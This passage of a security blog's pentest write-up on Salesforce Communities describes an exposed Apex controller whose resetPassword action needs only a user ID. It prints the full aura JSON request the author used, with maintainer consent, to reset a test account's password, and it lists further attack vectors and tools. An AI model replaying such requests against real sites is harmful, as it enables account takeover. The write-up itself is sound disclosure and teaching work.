+          </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apex://String"</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+      </span><span class="p">]</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<p>We can notice from its descriptor that the <code class="language-plaintext highlighter-rouge">resetPassword</code> ACTION accepts only two string parameters:</p>
+<ul>
+  <li>userID</li>
+  <li>newPassword</li>
+</ul>
+
+<p><br />
+<strong>This is not good!</strong></p>
+
+<p>By not requiring the user’s previous password or a valid reset password token, this controller can potentially be abused to reset <strong><em>any</em></strong> user’s password starting from a simple userID (permissions apart). Furthermore, UserIDs can be extracted from the standard object <code class="language-plaintext highlighter-rouge">User</code>, as we did in the previous section.</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-user-ids.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-user-ids.png" alt="" loading="lazy"></a>
+<em>list of User IDs extracted from the <code class="language-plaintext highlighter-rouge">User</code> standard object</em></p>
+
+<p>Probably this controller was not meant to be contacted from the outside, I think it was for internal use as a result of the call to the <code class="language-plaintext highlighter-rouge">chagePassword</code> method, but since it was placed inside the <code class="language-plaintext highlighter-rouge">CA_ChangePasswordSettingController</code> class, which is exposed, it ended up being wrongly exposed as well.</p>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-changepassword.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-changepassword.png" alt="" loading="lazy"></a><br />
+<em><code class="language-plaintext highlighter-rouge">changePassword</code> method contained inside <code class="language-plaintext highlighter-rouge">CA_ChangePasswordSettingController</code></em></p>
+
+<p>Since I was running the tests on production sites, I immediately reached out to the Communities maintainers, explaining to them the issue and the possible critical impacts. They provided me with a sample userID with which I can test the functionality.</p>
+
+<p>Having everything required, I used the descriptor to replicate a valid aura call to the Apex controller <code class="language-plaintext highlighter-rouge">CA_ChangePasswordSettingController</code>, and finally reset the user’s password and took over his account.</p>
+
+<div class="language-json highlighter-rouge"><div class="code-header">
+        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre><span class="p">{</span><span class="w">
+  </span><span class="nl">"actions"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"123;a"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"descriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"apex://CA_ChangePasswordSettingController/ACTION$resetPassword"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"callingDescriptor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"UNKNOWN"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"params"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+        </span><span class="nl">"userID"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0056&lt;REDACTED&gt;M"</span><span class="p">,</span><span class="w">
+        </span><span class="nl">"newPassword"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RT-wofnwo2!$4nfi!"</span><span class="w">
+      </span><span class="p">}</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></pre></td></tr></tbody></table></code></div></div>
+
+<p><a href="/assets/img/Salesforce-PT/salesforce-passwordreset.png" class="popup img-link shimmer"><img src="/assets/img/Salesforce-PT/salesforce-passwordreset.png" alt="" loading="lazy"></a>
+<em>User’s password successfully reset</em></p>
+
+<p>This vulnerability could have had a <em>massive</em> impact. Even though custom controllers are pretty straightforward to find, they are often overlooked during Salesforce penetration tests because not every tester knows this particular attack vector.</p>
+
+<h3 id="other-attack-vectors-and-interesting-cases"><span class="me-2">Other attack vectors and interesting cases</span><a href="#other-attack-vectors-and-interesting-cases" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>In addition to the permission problems on standard and custom objects, the exposure of custom controllers, and the classic web vulnerabilities like XSS and unsecured APIs, there are other attack vectors that I did not find directly during testing but have read about online and will list below:</p>
+<ul>
+  <li>SOQL Injection <sup id="fnref:soql-injection-doc"><a href="#fn:soql-injection-doc" class="footnote" rel="footnote" role="doc-noteref">15</a></sup> <sup id="fnref:soql-injaection-lab"><a href="#fn:soql-injaection-lab" class="footnote" rel="footnote" role="doc-noteref">16</a></sup> <sup id="fnref:soql-injection"><a href="#fn:soql-injection" class="footnote" rel="footnote" role="doc-noteref">17</a></sup> <sup id="fnref:2nd-order-soqlinjection"><a href="#fn:2nd-order-soqlinjection" class="footnote" rel="footnote" role="doc-noteref">18</a></sup> and Blind SOQL Injection <sup id="fnref:blind-soql"><a href="#fn:blind-soql" class="footnote" rel="footnote" role="doc-noteref">19</a></sup> <sup id="fnref:soql-subquery-blind"><a href="#fn:soql-subquery-blind" class="footnote" rel="footnote" role="doc-noteref">20</a></sup></li>
+  <li><a href="https://www.varonis.com/blog/apex-code-vulnerabilities#:~:text=Apex%20vulnerabilities">“Without sharing” Apex vulnerability</a>, varonis.com</li>
+  <li><a href="https://www.varonis.com/blog/salesforce-ghost-sites">Ghost Sites: Stealing Data From Deactivated Salesforce Communities</a>, varonis.com</li>
+  <li><a href="https://developer.salesforce.com/blogs/2023/08/the-top-20-vulnerabilities-found-in-the-appexchange-security-review">The Top 20 Vulnerabilities Found in the AppExchange Security Review</a>, developer.salesforce.com</li>
+  <li><a href="https://www.varonis.com/blog/abusing-salesforce-communities#:~:text=Other%20undocumented%20endpoints">Undocumented descriptors and endpoints</a>, varonis.com</li>
+</ul>
+
+<h2 id="tools-and-labs"><span class="me-2">Tools and Labs</span><a href="#tools-and-labs" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+
+<p>To facilitate analysis and enumeration, there are a few tools (with their limitations and shortcomings) that can help speed up and automate the work:</p>
+<ul>
+  <li><a href="https://github.com/projectdiscovery/nuclei">nuclei</a> and salesforce templates <sup id="fnref:nuclei-template:1"><a href="#fn:nuclei-template" class="footnote" rel="footnote" role="doc-noteref">8</a></sup><sup id="fnref:nuclei-template2"><a href="#fn:nuclei-template2" class="footnote" rel="footnote" role="doc-noteref">21</a></sup></li>
+  <li><a href="https://github.com/moniik/poc_salesforce_lightning">poc_salesforce_lightning</a></li>
+  <li><a href="https://github.com/salesforce/lightning-burp">lightning-burp</a></li>
+</ul>
+
+<blockquote>
+  <p><em>I have not found other useful tools, but please <a href="http://localhost:4000/about/#contact">let me know</a> if I have missed something!</em></p>
+</blockquote>
+
+<p>If you need a lab to practice with, have a look at the following links:</p>
+<ul>
+  <li><a href="https://github.com/Coalfire-Research/paas-cloud-goat">paas-cloud-goat</a>, Coalfire-Research; github.com</li>
+</ul>
+
+<div class="footnotes" role="doc-endnotes">
+  <ol>
+    <li id="fn:1">
+      <p><a href="https://www.salesforce.com/eu/campaign/lightning/">Salesforce Lightning: The Future of Sales and CRM</a>, salesforce.com <a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:2">
+      <p><a href="https://www.salesforce.com/eu/products/platform/lightning/">Lightning Platform: Building blocks of better apps</a>, salesforce.com <a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:salesforce-objects">
+      <p><a href="https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_concepts.htm">Overview of Salesforce Objects and Fields</a>, developer.salesforce.com <a href="#fnref:salesforce-objects" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:std-objects">
+      <p><a href="https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_objects_list.htm">Standard Objects</a>, developer.salesforce.com <a href="#fnref:std-objects" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a> <a href="#fnref:std-objects:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;<sup>2</sup></a></p>
+    </li>
+    <li id="fn:custom-objects">
+      <p><a href="https://developer.salesforce.com/docs/atlas.en-us.object_reference.meta/object_reference/sforce_api_custom_objects_list.htm">Custom Objects</a>, developer.salesfroce.com <a href="#fnref:custom-objects" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:aura-comp">
+      <p><a href="https://developer.salesforce.com/docs/atlas.en-us.lightning.meta/lightning/intro_components.htm">Aura Components</a>, developer.salesforce.com <a href="#fnref:aura-comp" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:salesforce-targets">
+      <p><a href="https://www.enumerated.ie/index/salesforce#recon%20process">Salesforce Recon Process</a>, enumerated.ie <a href="#fnref:salesforce-targets" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:nuclei-template">
+      <p><a href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/salesforce-aura.yaml">salesforce-aura.yaml</a>, github.com <a href="#fnref:nuclei-template" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a> <a href="#fnref:nuclei-template:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;<sup>2</sup></a></p>
+    </li>
+    <li id="fn:gau">
+      <p><a href="https://github.com/lc/gau">gau</a>, github.com <a href="#fnref:gau" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:waymore">
+      <p><a href="https://github.com/xnl-h4ck3r/waymore">waymore</a>, github.com <a href="#fnref:waymore" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:resp-grep">
+      <p><a href="https://portswigger.net/bappstore/665178d3bf494019b3e8fe53a133528b">Response Grepper</a>, portswigger.net <a href="#fnref:resp-grep" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:appomni">
+      <p><a href="https://appomni.com/ao-labs/lightning-components-a-treatise-on-apex-security-from-an-external-perspective/#:~:text=Retrieving%20the%20markup%20descriptor%20of%20custom%20Components">Retrieving the markup descriptor of custom Components</a>, appomni.com <a href="#fnref:appomni" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:getobjectinfo">
+      <p><a href="https://developer.salesforce.com/docs/platform/lwc/guide/reference-wire-adapters-object-info.html"><code class="language-plaintext highlighter-rouge">getObjectInfo</code></a>, developer.salesforce.com <a href="#fnref:getobjectinfo" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:get-record">
+      <p><a href="https://developer.salesforce.com/docs/platform/lwc/guide/reference-wire-adapters-record.html?q=getRecord"><code class="language-plaintext highlighter-rouge">getRecord</code></a>, developer.salesforce.com <a href="#fnref:get-record" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:soql-injection-doc">
+      <p><a href="https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/pages_security_tips_soql_injection.htm">SOQL Injection</a>, developer.salesforce.com <a href="#fnref:soql-injection-doc" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:soql-injaection-lab">
+      <p><a href="https://infosecwriteups.com/soql-injection-b2c2c624cbbb">SOQL Injection Lab.</a>, infosecwriteups.com <a href="#fnref:soql-injaection-lab" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:soql-injection">
+      <p><a href="https://hackerone.com/reports/1046084">SQL Injection Union Based</a>, hackerone.com <a href="#fnref:soql-injection" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:2nd-order-soqlinjection">
+      <p><a href="https://hackerone.com/reports/1039821">Second-order SOQL injection through email and campaign name parameter</a>, heckerone.com <a href="#fnref:2nd-order-soqlinjection" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:blind-soql">
+      <p><a href="https://appomni.com/ao-labs/lightning-components-a-treatise-on-apex-security-from-an-external-perspective/#:~:text=public%20or%20not.-,Blind%20SOQL%20Injection,-Basic%20SOQL%20injection">Blind SOQL Injection</a>, appomni.com <a href="#fnref:blind-soql" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:soql-subquery-blind">
+      <p><a href="https://www.varonis.com/blog/manipulating-salesforce-public-links#:~:text=SOQL%20subquery%20blind%20attack%C2%A0">SOQL subquery blind attack</a>, varonis.com <a href="#fnref:soql-subquery-blind" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+    <li id="fn:nuclei-template2">
+      <p><a href="https://github.com/JoshMorrison99/my-nuceli-templates/blob/main/salesforce-misconfiguration.yaml">salesforce-misconfiguration.yaml</a>, github.com <a href="#fnref:nuclei-template2" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
+    </li>
+  </ol>
+</div>
+
+  </div>
+
+  <div class="post-tail-wrapper text-muted">
+    <!-- categories -->
+    
+      <div class="post-meta mb-3">
+        <i class="far fa-folder-open fa-fw me-1"></i>
+        
+          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
+          <a href="/categories/web-hacking/">Web Hacking</a>
+      </div>
+    
+
+    <!-- tags -->
+    
+      <div class="post-tags">
+        <i class="fa fa-tags fa-fw me-1"></i>
+        
+          <a
+            href="/tags/salesforce/"
+            class="post-tag no-text-decoration"
+          >salesforce</a>
+        
+          <a
+            href="/tags/ato/"
+            class="post-tag no-text-decoration"
+          >ATO</a>
+        
+      </div>
+    
+
+    <div
+      class="
+        post-tail-bottom
+        d-flex justify-content-between align-items-center mt-5 pb-2
+      "
+    >
+      <div class="license-wrapper">
+        
+          
+
+          This post is licensed under 
+        <a href="https://creativecommons.org/licenses/by/4.0/">
+          CC BY 4.0
+        </a>
+         by the author.
+        
+      </div>
+
+      <!-- Post sharing snippet -->
+
+<div class="share-wrapper d-flex align-items-center">
+  <span class="share-label text-muted">Share</span>
+  <span class="share-icons">
+    
+    
+    
+
+    
+
+      
+
+      <a href="https://twitter.com/intent/tweet?text=Pentesting%20Salesforce%20Communities%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsalesforce-hacking%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
+        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.facebook.com/sharer/sharer.php?title=Pentesting%20Salesforce%20Communities%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsalesforce-hacking%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
+        <i class="fa-fw fab fa-facebook-square"></i>
+      </a>
+    
+
+      
+
+      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsalesforce-hacking%2F&text=Pentesting%20Salesforce%20Communities%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
+        <i class="fa-fw fab fa-telegram"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsalesforce-hacking%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
+        <i class="fa-fw fab fa-linkedin"></i>
+      </a>
+    
+
+      
+
+      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fsalesforce-hacking%2F&title=Pentesting%20Salesforce%20Communities%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
+        <i class="fa-fw fa-brands fa-square-reddit"></i>
+      </a>
+    
+
+    <button
+      id="copy-link"
+      aria-label="Copy link"
+      class="btn small"
+      data-bs-toggle="tooltip"
+      data-bs-placement="top"
+      title="Copy link"
+      data-title-succeed="Link copied successfully!"
+    >
+      <i class="fa-fw fas fa-link pe-none fs-6"></i>
+    </button>
+  </span>
+</div>
+
+    </div>
+    <!-- .post-tail-bottom -->
+  </div>
+  <!-- div.post-tail-wrapper -->
+</article>
+
+
+            
+          </main>
+
+          <!-- panel -->
+          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
+            <div class="access">
+              <!-- Get 5 last posted/updated posts -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <section id="access-lastmod">
+    <h2 class="panel-heading">Recently Updated</h2>
+    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
+        </li>
+      
+        
+        
+        
+        <li class="text-truncate lh-lg">
+          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
+        </li>
+      
+    </ul>
+  </section>
+  <!-- #access-lastmod -->
+
+
+              <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
+      
+    </div>
+  </section>
+
+
+            </div>
+
+            
+              
+              
+
+
+
+
+
+
+  <div class="toc-border-cover z-3"></div>
+  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
+    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
+    <nav id="toc"></nav>
+  </section>
+
+
+            
+          </aside>
+        </div>
+
+        <div class="row">
+          <!-- tail -->
+          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
+            
+              
+              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->
+
+<!-- The total size of related posts -->
+
+
+<!-- An random integer that bigger than 0 -->
+
+
+<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1754949600"
+  data-df="ll"
+  
+>
+  Aug 12, 2025
+</time>
+
+              <h4 class="pt-0 my-2">Vtenext 25.02 vulnerability research</h4>
+              <div class="text-muted">
+                <p>Multiple vulnerabilities in vtenext 25.02.1 and prior versions allow unauthenticated attackers to bypass authentication through three separate vectors, ultimately leading to remote code execution on the underlying server.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/hacking-custom-reset-password-tokens/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1684188000"
+  data-df="ll"
+  
+>
+  May 16, 2023
+</time>
+
+              <h4 class="pt-0 my-2">Defeating custom password reset tokens</h4>
+              <div class="text-muted">
+                <p>This blog post presents a detailed analysis of two successful account takeover scenarios resulting from vulnerabilities in a forgot password implementation. I explore techniques involving anti-tampering token prediction and time-based/sandwich attacks.</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/waf-bypass-exploiting-parser-differentials/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1681250400"
+  data-df="ll"
+  
+>
+  Apr 12, 2023
+</time>
+
+              <h4 class="pt-0 my-2">WAF bypass and vulnerability chain exploiting parser differentials</h4>
+              <div class="text-muted">
+                <p>HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/parliamo-di-community-rev3rse-meethack/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>Let's talk about communities with Meethack Torino</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/effective-notes-with-obsidian/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</p>
+    </a>
+  
+</nav>
+
+            
+
+            <footer
+  aria-label="Site Info"
+  class="
+    d-flex flex-column justify-content-center text-muted
